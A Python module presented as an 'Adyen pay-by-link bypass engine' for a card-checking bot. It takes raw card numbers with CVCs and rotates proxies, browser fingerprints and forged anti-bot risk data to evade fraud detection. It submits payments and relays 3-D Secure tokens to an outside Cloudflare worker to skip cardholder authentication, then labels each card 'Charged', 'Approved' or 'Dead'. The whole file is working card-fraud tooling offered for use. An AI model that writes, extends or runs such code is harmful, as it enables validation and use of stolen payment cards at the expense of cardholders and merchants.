"""
adyen_engine.py — Adyen pay-by-link bypass engine.

Refactored from ayden.py — importable module version.
Exposes:
    process_payment(link, cc_raw, proxy_data) -> dict   (raw engine result)
    run_check(link, card, proxy) -> dict                (bot-shaped result)

Uses helpers.proxy_dict_to_url for proxy normalization.
Requires: curl_cffi, pycryptodome, helpers.py
"""
import os
import re
import json
import time
import random
import uuid
import asyncio
import hashlib
import sys
import base64
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
from typing import Optional

try:
    from curl_cffi.requests import AsyncSession as CffiSession
except ImportError:
    print("adyen_engine: please install curl_cffi: pip install curl_cffi")
    sys.exit(1)

try:
    from Crypto.PublicKey import RSA
    from Crypto.Cipher import PKCS1_OAEP, AES
    from Crypto.Hash import SHA256
except ImportError:
    print("adyen_engine: please install pycryptodome: pip install pycryptodome")
    sys.exit(1)

from helpers import proxy_dict_to_url


ADYEN_3DS_WORKER = "https://adyen-3ds-bypass.muhammadkamaluddin603.workers.dev"


# ═══════════════════════════════════════════════════════════════════════════
#  SPOOFING — Browser fingerprints, UAs, screen profiles
# ═══════════════════════════════════════════════════════════════════════════
_IMPERSONATE_POOL = ["chrome131", "chrome133a", "chrome136"]

_UA_POOL = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36", "Win32", "Windows", False),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36", "Win32", "Windows", False),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36", "Win32", "Windows", False),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36", "Win32", "Windows", False),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36", "MacIntel", "macOS", False),
]

_SCREEN_PROFILES = {
    "Windows": [
        (1920, 1080, 1920, 1040, 1.0, -300, "America/New_York"),
        (1920, 1080, 1920, 1040, 1.25, -360, "America/Chicago"),
        (1536, 864, 1536, 816, 1.25, -300, "Asia/Karachi"),
        (2560, 1440, 2560, 1400, 1.5, -480, "America/Los_Angeles"),
        (1920, 1080, 1920, 1040, 1.0, 0, "Europe/London"),
        (1920, 1080, 1920, 1040, 1.0, -60, "Europe/Paris"),
        (1920, 1080, 1920, 1040, 1.0, -330, "Asia/Kolkata"),
        (1536, 864, 1536, 816, 1.25, -330, "Asia/Kolkata"),
    ],
    "macOS": [
        (1440, 900, 1440, 820, 2.0, -300, "America/New_York"),
        (1680, 1050, 1680, 970, 2.0, -480, "America/Los_Angeles"),
        (1920, 1080, 1920, 1000, 2.0, 0, "Europe/London"),
        (1536, 864, 1536, 816, 2.0, -300, "Asia/Karachi"),
    ],
}

_LANGUAGE_PROFILES = [
    (["en-US", "en"], 0.50),
    (["en-GB", "en"], 0.20),
    (["en-CA", "en"], 0.10),
    (["en-AU", "en"], 0.05),
    (["de-DE", "de", "en"], 0.05),
    (["fr-FR", "fr", "en"], 0.05),
    (["es-ES", "es", "en"], 0.05),
]

_HOLDER_FIRST = [
    "James", "John", "Robert", "Michael", "David", "William", "Richard", "Thomas",
    "Maria", "Sarah", "Emma", "Anna", "Lisa", "Laura", "Sophie", "Julia",
    "Daniel", "Alexander", "Andrew", "Chris", "Paul", "Mark", "Peter", "Steven",
    "Jennifer", "Jessica", "Ashley", "Emily", "Megan", "Rachel", "Nicole", "Amanda",
]

_HOLDER_LAST = [
    "Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis",
    "Rodriguez", "Martinez", "Hernandez", "Lopez", "Wilson", "Anderson", "Thomas",
    "Taylor", "Moore", "Jackson", "Martin", "Lee", "Thompson", "White", "Harris",
    "Clark", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright",
]

_WEBGL_RENDERERS = {
    "Windows": [
        "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 (0x00002504) Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (NVIDIA, NVIDIA GeForce RTX 4070 (0x00002786) Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (Intel, Intel(R) UHD Graphics 630 (0x00003E92) Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (AMD, AMD Radeon RX 6700 XT (0x000073DF) Direct3D11 vs_5_0 ps_5_0, D3D11)",
        "ANGLE (AMD, AMD Radeon(TM) Graphics (0x00001638) Direct3D11 vs_5_0 ps_5_0, D3D11)",
    ],
    "macOS": [
        "ANGLE (Apple, ANGLE Metal Renderer: Apple M1, Unspecified Version)",
        "ANGLE (Apple, ANGLE Metal Renderer: Apple M2, Unspecified Version)",
        "ANGLE (Apple, ANGLE Metal Renderer: Apple M3, Unspecified Version)",
    ],
}


def _extract_chrome_ver(ua: str) -> int:
    m = re.search(r'Chrome/(\d+)', ua)
    return int(m.group(1)) if m else 131


_SEC_CH_UA_BRANDS = {
    range(130, 137): ('"Not_A Brand"', "8"),
    range(137, 145): ('"Not/A)Brand"', "8"),
    range(145, 150): ('"Not)A;Brand"', "24"),
    range(150, 160): ('"Not?A_Brand"', "8"),
}


def _build_sec_ch_ua(chrome_ver: int, is_mobile: bool) -> tuple:
    brand_name, brand_v = '"Not_A Brand"', "8"
    for ver_range, (b_name, b_ver) in _SEC_CH_UA_BRANDS.items():
        if chrome_ver in ver_range:
            brand_name, brand_v = b_name, b_ver
            break
    sec_ch_ua = f'"Google Chrome";v="{chrome_ver}", "Chromium";v="{chrome_ver}", {brand_name};v="{brand_v}"'
    return sec_ch_ua, "?1" if is_mobile else "?0"


def _weighted_choice(profiles: list):
    items, weights = zip(*profiles)
    return random.choices(items, weights=weights, k=1)[0]


def random_impersonate() -> str:
    return random.choice(_IMPERSONATE_POOL)


def random_fingerprint() -> dict:
    ua, js_platform, os_label, is_mobile = random.choice(_UA_POOL)
    chrome_ver = _extract_chrome_ver(ua)
    profile = random.choice(_SCREEN_PROFILES[os_label])
    screen_w, screen_h, avail_w, avail_h, dpr, tz_offset, tz_name = profile
    languages = _weighted_choice(_LANGUAGE_PROFILES)
    sec_ch_ua, sec_ch_ua_mobile = _build_sec_ch_ua(chrome_ver, is_mobile)

    return {
        "ua": ua, "platform": js_platform, "os_label": os_label, "is_mobile": is_mobile,
        "chrome_ver": chrome_ver,
        "screen_width": screen_w, "screen_height": screen_h,
        "avail_width": avail_w, "avail_height": avail_h,
        "pixel_ratio": dpr, "languages": languages,
        "sec_ch_ua": sec_ch_ua, "sec_ch_ua_mobile": sec_ch_ua_mobile,
        "tz_offset": tz_offset, "tz_name": tz_name,
        "color_depth": 32,
        "device_memory": random.choice([4, 8, 8, 16, 16, 32]),
        "hw_concurrency": random.choice([4, 8, 8, 12, 16]),
        "webgl_renderer": random.choice(_WEBGL_RENDERERS.get(os_label, _WEBGL_RENDERERS["Windows"])),
    }


def fingerprint_headers(ua: str, fp: dict, chrome_ver: int = 131, *,
                        fetch_dest: str = "document", fetch_mode: str = "navigate",
                        fetch_site: str = "none", extra: Optional[dict] = None) -> dict:
    ver = fp.get("chrome_ver", chrome_ver)
    is_mobile = fp.get("is_mobile", False)
    sec_ch_ua = fp.get("sec_ch_ua") or _build_sec_ch_ua(ver, is_mobile)[0]
    sec_ch_ua_m = fp.get("sec_ch_ua_mobile") or ("?1" if is_mobile else "?0")
    os_label = fp.get("os_label", "Windows")
    languages = fp.get("languages", ["en-US", "en"])

    lang_header = f"{languages[0]},{','.join(languages[1:])};q=0.9"

    headers = {
        "user-agent": ua, "accept-language": lang_header,
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-ch-ua": sec_ch_ua, "sec-ch-ua-mobile": sec_ch_ua_m,
        "sec-ch-ua-platform": f'"{os_label}"',
        "sec-fetch-dest": fetch_dest, "sec-fetch-mode": fetch_mode,
        "sec-fetch-site": fetch_site,
    }
    if fetch_dest == "document":
        headers["accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
        headers["upgrade-insecure-requests"] = "1"
        headers["sec-fetch-user"] = "?1"
    else:
        headers["accept"] = "application/json, text/plain, */*"

    if extra:
        headers.update(extra)
    return headers


# ═══════════════════════════════════════════════════════════════════════════
#  ADYEN RISK DATA
# ═══════════════════════════════════════════════════════════════════════════
def _md5(s: str) -> str:
    return hashlib.md5(s.encode()).hexdigest()


def _generate_dfp() -> str:
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    head = "".join(random.choice(chars) for _ in range(10))
    tail = "".join(random.choice(chars) for _ in range(30))
    return f"{head}00500000000000000{tail}00000{''.join(random.choice(chars) for _ in range(18))}:40"


def _generate_risk_data(fp: dict) -> dict:
    ua_hash = _md5(fp["ua"])
    plugins_hash = _md5(f"plugins_{fp['ua']}_{random.random()}")
    canvas_hash = _md5(f"canvas_{fp['screen_width']}x{fp['screen_height']}_{random.random()}")
    webgl_hash = _md5(f"webgl_{fp['webgl_renderer']}_{random.random()}")
    fonts_hash = _md5(f"fonts_{fp['ua']}_{random.random()}")
    audio_hash = _md5(f"audio_{random.random()}")
    devices_hash = _md5(f"devices_{random.random()}")

    gpu_vendor = "Google Inc."
    gpu_parts = fp["webgl_renderer"]
    if "ANGLE" in gpu_parts:
        brand = gpu_parts.split(",")[0].replace("ANGLE (", "").strip()
        vendor_renderer = f"{gpu_vendor} ({brand})~{gpu_parts}"
    else:
        vendor_renderer = f"{gpu_vendor} (Intel)~{gpu_parts}"

    components = {
        "userAgent": ua_hash,
        "webdriver": 0,
        "language": fp["languages"][0],
        "colorDepth": fp["color_depth"],
        "deviceMemory": fp["device_memory"],
        "pixelRatio": fp["pixel_ratio"],
        "hardwareConcurrency": fp["hw_concurrency"],
        "screenWidth": fp["screen_height"],
        "screenHeight": fp["screen_width"],
        "availableScreenWidth": fp["avail_height"],
        "availableScreenHeight": fp["avail_width"],
        "timezoneOffset": fp["tz_offset"],
        "timezone": fp["tz_name"],
        "sessionStorage": 1,
        "localStorage": 1,
        "indexedDb": 1,
        "addBehavior": 0,
        "openDatabase": 0,
        "platform": fp["platform"],
        "plugins": plugins_hash,
        "canvas": canvas_hash,
        "webgl": webgl_hash,
        "webglVendorAndRenderer": vendor_renderer,
        "adBlock": 0,
        "hasLiedLanguages": 0,
        "hasLiedResolution": 0,
        "hasLiedOs": 0,
        "hasLiedBrowser": 0,
        "fonts": fonts_hash,
        "audio": audio_hash,
        "enumerateDevices": devices_hash,
        "visitedPages": [],
        "batteryInfo": {
            "batteryLevel": random.choice([80, 90, 95, 100]),
            "batteryCharging": random.choice([True, True, True, False]),
        },
        "botDetectors": {
            "webDriver": False,
            "cookieEnabled": True,
            "headlessBrowser": False,
            "noLanguages": False,
            "inconsistentEval": False,
            "inconsistentPermissions": False,
            "domManipulation": False,
            "appVersionSuspicious": False,
            "functionBindSuspicious": True,
            "botInUserAgent": False,
            "windowSizeSuspicious": False,
            "botInWindowExternal": False,
            "webGL": False,
        },
    }

    rp_uid = str(uuid.uuid4())

    payload = {
        "version": "1.0.0",
        "deviceFingerprint": _generate_dfp(),
        "persistentCookie": [f"_rp_uid={rp_uid}"],
        "components": components,
    }

    return {
        "clientData": base64.b64encode(
            json.dumps(payload, separators=(",", ":")).encode()
        ).decode()
    }


def _random_holder_name() -> str:
    return f"{random.choice(_HOLDER_FIRST)} {random.choice(_HOLDER_LAST)}"


# ═══════════════════════════════════════════════════════════════════════════
#  ADYEN CSE (Client-Side Encryption)
# ═══════════════════════════════════════════════════════════════════════════
def adyen_encrypt(public_key_str: str, payload_dict: dict) -> str:
    exp_hex, mod_hex = public_key_str.split('|')
    n = int(mod_hex, 16)
    e = int(exp_hex, 16)
    rsa_key = RSA.construct((n, e))

    aes_key = os.urandom(32)
    iv = os.urandom(12)

    cipher_rsa = PKCS1_OAEP.new(rsa_key, hashAlgo=SHA256.new())
    enc_key = cipher_rsa.encrypt(aes_key)

    header = {"alg": "RSA-OAEP-256", "enc": "A256GCM", "version": "1"}
    header_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',', ':')).encode()).decode().rstrip('=')

    cipher_aes = AES.new(aes_key, AES.MODE_GCM, nonce=iv)
    cipher_aes.update(header_b64.encode('ascii'))

    payload_dict["generationtime"] = datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%S.000Z')
    plaintext = json.dumps(payload_dict)

    ciphertext, tag = cipher_aes.encrypt_and_digest(plaintext.encode('utf-8'))

    enc_key_b64 = base64.urlsafe_b64encode(enc_key).decode().rstrip('=')
    iv_b64 = base64.urlsafe_b64encode(iv).decode().rstrip('=')
    ciphertext_b64 = base64.urlsafe_b64encode(ciphertext).decode().rstrip('=')
    tag_b64 = base64.urlsafe_b64encode(tag).decode().rstrip('=')

    return f"{header_b64}.{enc_key_b64}.{iv_b64}.{ciphertext_b64}.{tag_b64}"


# ═══════════════════════════════════════════════════════════════════════════
#  ADYEN SDK ANALYTICS
# ═══════════════════════════════════════════════════════════════════════════
def _generate_checkout_attempt_id() -> str:
    uid = str(uuid.uuid4())
    ts = str(int(time.time() * 1000))
    rand_hash = hashlib.sha256(f"{uid}{ts}{os.urandom(16).hex()}".encode()).hexdigest().upper()
    return f"{uid}{ts}{rand_hash}"


def _build_sdk_data(checkout_attempt_id: str, risk_data: dict) -> str:
    payload = {
        "schemaVersion": 1,
        "createdAt": int(time.time() * 1000),
        "analytics": {"checkoutAttemptId": checkout_attempt_id},
        "riskData": risk_data,
    }
    return base64.b64encode(json.dumps(payload, separators=(",", ":")).encode()).decode()


async def _register_analytics(s, client_key: str, session_id: str, checkout_attempt_id: str,
                              fp: dict, referer: str, headers_xhr: dict):
    analytics_host = "checkoutanalytics-live.adyen.com"
    analytics_url = f"https://{analytics_host}/checkoutanalytics/v3/analytics?clientKey={client_key}"

    init_payload = {
        "version": "6.32.1",
        "buildType": "umd",
        "channel": "Web",
        "platform": "Web",
        "locale": "en-US",
        "referrer": referer,
        "screenWidth": fp["screen_width"],
        "checkoutStage": "checkout",
        "level": "all",
        "sessionId": session_id,
        "checkoutAttemptId": checkout_attempt_id,
    }

    analytics_headers = {
        "content-type": "application/json",
        "accept": "application/json, text/plain, */*",
        "user-agent": fp["ua"],
        "origin": "https://eu.adyen.link",
        "referer": referer,
        "sec-ch-ua": fp["sec_ch_ua"],
        "sec-ch-ua-mobile": fp["sec_ch_ua_mobile"],
        "sec-ch-ua-platform": f'"{fp["os_label"]}"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "cross-site",
    }

    try:
        await s.post(analytics_url, json=init_payload, headers=analytics_headers, timeout=10)
    except Exception:
        pass

    await asyncio.sleep(random.uniform(0.2, 0.5))

    events_url = f"https://{analytics_host}/checkoutanalytics/v3/analytics/{checkout_attempt_id}?clientKey={client_key}"

    flavor_payload = {
        "flavor": "dropin",
        "checkoutAttemptId": checkout_attempt_id,
    }
    try:
        await s.post(analytics_url, json=flavor_payload, headers=analytics_headers, timeout=10)
    except Exception:
        pass

    return events_url, analytics_headers


# ═══════════════════════════════════════════════════════════════════════════
#  PAYMENT FLOW
# ═══════════════════════════════════════════════════════════════════════════
async def process_payment(link: str, cc_raw: str, proxy_data=None) -> dict:
    result = {
        "checkout_link": link,
        "cc": cc_raw,
        "product_name": None,
        "merchant_name": None,
        "return_url": None,
        "currency": None,
        "amount": None,
        "supported_cards": [],
        "payment_status_code": None,
        "payment_status": None,
        "3d_bypassed": False,
        "3ds_method": None,
        "error": None,
    }

    parts = cc_raw.strip().split('|')
    if len(parts) != 4:
        result["error"] = "Invalid CC format. Expected: CC|MM|YY|CVC"
        return result

    number, month, year, cvc = parts

    if len(year) == 2:
        year = "20" + year
    if len(month) == 1:
        month = "0" + month

    link_id = link.rstrip('/').split('/')[-1]

    impersonate = random_impersonate()
    fp = random_fingerprint()

    proxy_url = proxy_dict_to_url(proxy_data)
    session_kwargs = {"impersonate": impersonate}
    if proxy_url:
        session_kwargs["proxy"] = proxy_url

    async with CffiSession(**session_kwargs) as s:
        # ── Step 1: Load checkout page ──
        headers_nav = fingerprint_headers(fp["ua"], fp, fetch_dest="document", fetch_site="none")
        r_page = await s.get(link, headers=headers_nav)
        page_url = str(r_page.url)
        parsed_page = urlparse(page_url)
        page_origin = f"{parsed_page.scheme}://{parsed_page.netloc}"

        api_host = "checkoutshopper-live.adyen.com"
        if parsed_page.netloc == api_host:
            fetch_site = "same-origin"
            xhr_origin = f"https://{api_host}"
        else:
            fetch_site = "cross-site"
            xhr_origin = page_origin
        xhr_referer = page_url

        headers_xhr = fingerprint_headers(fp["ua"], fp, fetch_dest="empty", fetch_mode="cors",
                                          fetch_site=fetch_site, extra={
            "content-type": "application/json",
            "origin": xhr_origin,
            "referer": xhr_referer,
            "priority": "u=1, i",
        })

        await asyncio.sleep(random.uniform(0.5, 1.2))

        # ── Step 2: Pay-by-link setup ──
        setup_url = f"https://{api_host}/checkoutshopper/session/paybylink/v1/{link_id}/setup?generateSessionData=true"
        r_setup = await s.get(setup_url, headers=headers_xhr)

        if r_setup.status_code != 200:
            result["error"] = f"Setup failed with status {r_setup.status_code}"
            return result

        data = r_setup.json()
        result["merchant_name"] = data.get("theme", {}).get("displayName")

        if "paymentLink" in data:
            if "amount" in data["paymentLink"]:
                result["currency"] = data["paymentLink"]["amount"].get("currency")
                result["amount"] = data["paymentLink"]["amount"].get("value")
            return_url = data["paymentLink"].get("returnUrl")
            result["return_url"] = return_url
            product_name = data["paymentLink"].get("reference")
            if return_url:
                try:
                    parsed_return = urlparse(return_url)
                    qs = parse_qs(parsed_return.query)
                    if "next" in qs:
                        product_name = qs["next"][0].strip('/').split('/')[-1]
                except Exception:
                    pass
            result["product_name"] = product_name

        if "paymentLink" not in data or data["paymentLink"].get("status") != "active":
            result["error"] = f"Link not active. Status: {data.get('paymentLink', {}).get('status', 'unknown')}"
            return result

        dropin_cfg = data.get("dropinConfiguration", {})
        client_key = dropin_cfg.get("clientKey", "")
        dropin_session = dropin_cfg.get("session", {})

        session_id = dropin_session.get("id") or data.get("sessionId") or data.get("id") or data["paymentLink"]["id"]
        session_data = dropin_session.get("sessionData") or data.get("sessionData")

        if not session_data:
            result["error"] = "No sessionData found"
            return result

        # ── Step 3: Public Key ──
        r_key = await s.get(f"https://{api_host}/checkoutshopper/v1/clientKeys/{client_key}", headers=headers_xhr)
        pub_key = r_key.json().get("publicKey")
        if not pub_key:
            result["error"] = "Failed to fetch public key"
            return result

        await asyncio.sleep(random.uniform(0.3, 0.8))

        # ── Step 4: Session setup POST ──
        setup_post_url = f"https://{api_host}/checkoutshopper/v1/sessions/{session_id}/setup?clientKey={client_key}"
        r_sp = await s.post(setup_post_url, json={"sessionData": session_data}, headers=headers_xhr)

        if r_sp.status_code == 200:
            sp_data = r_sp.json()
            if "sessionData" in sp_data:
                session_data = sp_data["sessionData"]
            if "paymentMethods" in sp_data and isinstance(sp_data["paymentMethods"], dict) and "paymentMethods" in sp_data["paymentMethods"]:
                for pm in sp_data["paymentMethods"]["paymentMethods"]:
                    if pm.get("type") in ["scheme", "applepay", "googlepay"] and "brands" in pm:
                        for brand in pm["brands"]:
                            if brand not in result["supported_cards"]:
                                result["supported_cards"].append(brand)
                    if "configuration" in pm and "merchantName" in pm["configuration"]:
                        if not result["merchant_name"]:
                            result["merchant_name"] = pm["configuration"]["merchantName"]

        await asyncio.sleep(random.uniform(0.3, 0.7))

        # ── Step 4b: SDK Analytics ──
        checkout_attempt_id = _generate_checkout_attempt_id()
        referer_url = link if link.startswith("http") else f"https://eu.adyen.link/{link_id}"
        await _register_analytics(s, client_key, session_id, checkout_attempt_id, fp, referer_url, headers_xhr)

        await asyncio.sleep(random.uniform(1.0, 2.0))

        # ── Step 5: BIN Lookup ──
        enc_bin = adyen_encrypt(pub_key, {"binValue": number[:8]})
        lookup_brands = result["supported_cards"] if result["supported_cards"] else ["diners", "discover", "jcb", "mc", "visa"]
        bin_payload = {
            "type": "card",
            "supportedBrands": lookup_brands,
            "encryptedBin": enc_bin,
            "requestId": str(uuid.uuid4()),
        }
        r_bin = await s.post(
            f"https://{api_host}/checkoutshopper/v3/bin/binLookup?token={client_key}",
            json=bin_payload, headers=headers_xhr,
        )

        detected_brand = None
        try:
            bin_data = r_bin.json()
            for b in bin_data.get("brands", []):
                if b.get("supported"):
                    detected_brand = b.get("brand")
                    b["cvcPolicy"] = "hidden"
                    break
        except Exception:
            pass

        await asyncio.sleep(random.uniform(0.8, 1.5))

        # ── Step 6: Encrypt card fields ──
        enc_number = adyen_encrypt(pub_key, {"number": number})
        enc_month = adyen_encrypt(pub_key, {"expiryMonth": month})
        enc_year = adyen_encrypt(pub_key, {"expiryYear": year})

        # ── Step 7: Submit Payment ──
        payments_url = f"https://{api_host}/checkoutshopper/v1/sessions/{session_id}/payments?clientKey={client_key}"

        payment_method_base = {
            "type": "scheme",
            "holderName": "",
            "encryptedCardNumber": enc_number,
            "encryptedExpiryMonth": enc_month,
            "encryptedExpiryYear": enc_year,
            "checkoutAttemptId": checkout_attempt_id,
        }
        if detected_brand:
            payment_method_base["brand"] = detected_brand

        risk_data = _generate_risk_data(fp)
        sdk_data = _build_sdk_data(checkout_attempt_id, risk_data)

        browser_info = {
            "acceptHeader": "*/*",
            "javaEnabled": False,
            "colorDepth": fp["color_depth"],
            "language": fp["languages"][0],
            "screenHeight": fp["screen_height"],
            "screenWidth": fp["screen_width"],
            "userAgent": fp["ua"],
            "timeZoneOffset": fp["tz_offset"],
        }

        payment_payload = {
            "sessionData": session_data,
            "riskData": risk_data,
            "paymentMethod": {**payment_method_base, "sdkData": sdk_data},
            "browserInfo": browser_info,
            "origin": xhr_origin,
            "clientStateDataIndicator": True,
        }

        r_pay = await s.post(payments_url, json=payment_payload, headers=headers_xhr)
        result["payment_status_code"] = r_pay.status_code

        try:
            resp_json = r_pay.json()
        except json.JSONDecodeError:
            result["error"] = "Could not decode JSON response"
            return result

        result_code = resp_json.get("resultCode", "")
        result["payment_status"] = result_code

        # ── 3DS2 Bypass via Cloudflare Worker ──
        if result_code == "IdentifyShopper" and resp_json.get("action", {}).get("subtype") == "fingerprint":
            action = resp_json["action"]
            payment_data = action["paymentData"]
            session_data_3ds = resp_json.get("sessionData", session_data)
            fp_token_b64 = action.get("token", "")

            worker_ok = False
            try:
                worker_payload = {
                    "fingerprintToken": fp_token_b64,
                    "paymentData": payment_data,
                    "sessionId": session_id,
                    "sessionData": session_data_3ds,
                    "clientKey": client_key,
                    "origin": xhr_origin,
                }
                r_wk = await s.post(
                    f"{ADYEN_3DS_WORKER}/full",
                    json=worker_payload,
                    headers={"content-type": "application/json"},
                    timeout=30,
                )
                wk = r_wk.json()

                wk_rc = (wk.get("resultCode") or "").lower()
                wk_status = (wk.get("status") or "").lower()

                if wk_rc in ("authorised", "received", "pending", "refused", "cancelled"):
                    result["3d_bypassed"] = bool(wk.get("bypassed", wk.get("path") == "frictionless"))
                    result["payment_status"] = wk.get("resultCode", "")
                    result["payment_status_code"] = 200
                    result["3ds_method"] = wk.get("path", "worker")
                    worker_ok = True
                elif wk_status == "challenge_required":
                    acs_host = wk.get("acsHost") or ""
                    result["error"] = f"3DS Challenge required{' (ACS: ' + acs_host + ')' if acs_host else ''}"
                    result["payment_status"] = "IdentifyShopper"
                    worker_ok = True
                elif wk_status == "error" or wk.get("error"):
                    result["error"] = wk.get("error", "3DS worker error")
                    worker_ok = True
            except Exception:
                pass

            if worker_ok:
                return result

            # ── Inline fallback: Method → Fingerprint → Frictionless check ──
            tds_method_url = tds_server_trans_id = tds_notification_url = None
            if fp_token_b64:
                try:
                    padded = fp_token_b64 + "=" * (4 - len(fp_token_b64) % 4)
                    fp_token_data = json.loads(base64.urlsafe_b64decode(padded))
                    tds_method_url = fp_token_data.get("threeDSMethodUrl")
                    tds_server_trans_id = fp_token_data.get("threeDSServerTransID")
                    tds_notification_url = fp_token_data.get("threeDSMethodNotificationURL")
                except Exception:
                    pass

            if tds_method_url and tds_server_trans_id and tds_notification_url:
                method_data_b64 = base64.b64encode(
                    json.dumps({
                        "threeDSServerTransID": tds_server_trans_id,
                        "threeDSMethodNotificationURL": tds_notification_url,
                    }, separators=(",", ":")).encode()
                ).decode()

                method_headers = fingerprint_headers(
                    fp["ua"], fp, fetch_dest="iframe", fetch_mode="navigate",
                    fetch_site="cross-site",
                    extra={"content-type": "application/x-www-form-urlencoded"},
                )
                try:
                    await s.post(
                        tds_method_url,
                        data=f"threeDSMethodData={method_data_b64}",
                        headers=method_headers,
                        timeout=8,
                    )
                    result["3ds_method"] = "completed"
                except Exception:
                    result["3ds_method"] = "timeout"

                await asyncio.sleep(random.uniform(0.8, 1.5))

            fp_result_b64 = base64.b64encode(
                json.dumps({"threeDSCompInd": "Y"}).encode()
            ).decode()
            fp_url = f"https://{api_host}/checkoutshopper/v1/submitThreeDS2Fingerprint?token={client_key}"

            r_fp = await s.post(fp_url, json={
                "fingerprintResult": fp_result_b64,
                "paymentData": payment_data,
            }, headers=headers_xhr)

            try:
                fp_resp = r_fp.json()
            except json.JSONDecodeError:
                result["error"] = "Fingerprint non-JSON response"
                return result

            if "details" in fp_resp and "threeDSResult" in fp_resp["details"]:
                result["3d_bypassed"] = True
                result["3ds_method"] = "frictionless"

                details_url = f"https://{api_host}/checkoutshopper/v1/sessions/{session_id}/paymentDetails?clientKey={client_key}"
                r_det = await s.post(details_url, json={
                    "sessionData": fp_resp.get("sessionData", session_data_3ds),
                    "details": {"threeDSResult": fp_resp["details"]["threeDSResult"]},
                }, headers=headers_xhr)

                result["payment_status_code"] = r_det.status_code
                try:
                    final_code = r_det.json().get("resultCode", "")
                    result["payment_status"] = final_code
                except json.JSONDecodeError:
                    result["error"] = "PaymentDetails non-JSON response"

            elif "action" in fp_resp and fp_resp.get("action", {}).get("subtype") == "challenge":
                acs_host = ""
                try:
                    ch_tok = fp_resp["action"].get("token", "")
                    padded = ch_tok + "=" * (4 - len(ch_tok) % 4)
                    ch_info = json.loads(base64.urlsafe_b64decode(padded))
                    acs_host = urlparse(ch_info.get("acsURL", "")).netloc
                except Exception:
                    pass
                result["error"] = f"3DS Challenge required{' (ACS: ' + acs_host + ')' if acs_host else ''}"

            elif "action" in fp_resp:
                result["error"] = f"3DS action not handled: {fp_resp['action'].get('type')}/{fp_resp['action'].get('subtype')}"
            else:
                result["error"] = "Unexpected fingerprint response"

        return result


# ═══════════════════════════════════════════════════════════════════════════
#  BOT WRAPPER — returns a dict shaped like thehitterbot's _make_result
# ═══════════════════════════════════════════════════════════════════════════
async def run_check(link: str, card: str, proxy: str = "") -> dict:
    """
    Entry point for thehitterbot.
    Runs an Adyen check and returns a result dict matching the bot's internal shape:
        {status, message, card, gateway, price, receipt_url, retry, proxy, time, bin_info}
    """
    t0 = time.monotonic()
    try:
        raw = await process_payment(link, card, proxy or None)
    except Exception as e:
        return {
            "status":    "Dead",
            "message":   f"Adyen engine error: {e}",
            "card":      card,
            "gateway":   "Adyen",
            "price":     "-",
            "receipt_url": "",
            "retry":     True,
            "proxy":     proxy or "",
            "time":      round(time.monotonic() - t0, 2),
            "bin_info":  None,
        }
    return _normalize_result(raw, card, proxy, t0)


def _normalize_result(ad: dict, card: str, proxy: str, t0: float) -> dict:
    """Convert Adyen engine output → bot result dict."""
    elapsed  = round(time.monotonic() - t0, 2)
    merchant = ad.get("merchant_name") or "Adyen"
    gateway  = f"Adyen · {merchant}"

    price = "-"
    if ad.get("amount") is not None:
        try:
            price = f"{float(ad['amount']) / 100:.2f} {ad.get('currency') or 'USD'}"
        except Exception:
            price = "-"

    ps  = (ad.get("payment_status") or "").lower()
    err = (ad.get("error") or "")

    if ad.get("3d_bypassed") or ps in ("authorised", "received", "pending"):
        return {
            "status":      "Charged",
            "message":     ad.get("payment_status") or "Authorised",
            "card":        card,
            "gateway":     gateway,
            "price":       price,
            "receipt_url": ad.get("return_url") or "",
            "retry":       False,
            "proxy":       proxy or "",
            "time":        elapsed,
            "bin_info":    None,
        }

    if ps in ("refused", "cancelled"):
        return {
            "status":      "Dead",
            "message":     ad.get("payment_status") or "Refused",
            "card":        card,
            "gateway":     gateway,
            "price":       price,
            "receipt_url": "",
            "retry":       False,
            "proxy":       proxy or "",
            "time":        elapsed,
            "bin_info":    None,
        }

    if "challenge required" in err.lower():
        return {
            "status":      "Approved",
            "message":     err or "3DS Challenge required",
            "card":        card,
            "gateway":     gateway,
            "price":       price,
            "receipt_url": "",
            "retry":       False,
            "proxy":       proxy or "",
            "time":        elapsed,
            "bin_info":    None,
        }

    return {
        "status":      "Dead",
        "message":     err or ad.get("payment_status") or "Adyen error",
        "card":        card,
        "gateway":     gateway,
        "price":       price,
        "receipt_url": "",
        "retry":       True,
        "proxy":       proxy or "",
        "time":        elapsed,
        "bin_info":    None,
    }